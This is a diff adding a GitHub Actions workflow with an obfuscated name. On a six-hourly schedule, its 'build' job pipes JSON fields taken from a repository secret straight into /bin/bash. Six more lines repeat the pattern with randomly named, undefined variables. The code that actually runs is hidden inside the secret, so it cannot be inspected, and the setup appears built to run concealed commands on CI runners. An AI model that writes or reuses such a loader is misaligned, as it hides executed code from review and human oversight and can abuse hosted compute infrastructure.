@@ -1,0 +1,24 @@
+name: mianyangdeyouu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mianyangdeyouu
+        env:
+          vto9: ${{ secrets.vto9 }}
+        run: |
+          echo $vto9 | jq -r .kv986 | /bin/bash
+          echo $vo617 | jq -r .u53155 | /bin/bash
+          echo $y88 | jq -r .ucds58950 | /bin/bash
+          echo $k1303 | jq -r .cairt19612 | /bin/bash
+          echo $cipd01373 | jq -r .ifui36289 | /bin/bash
+          echo $h32385 | jq -r .rpqr99 | /bin/bash
+          echo $khjz52 | jq -r .ghpw84 | /bin/bash
+
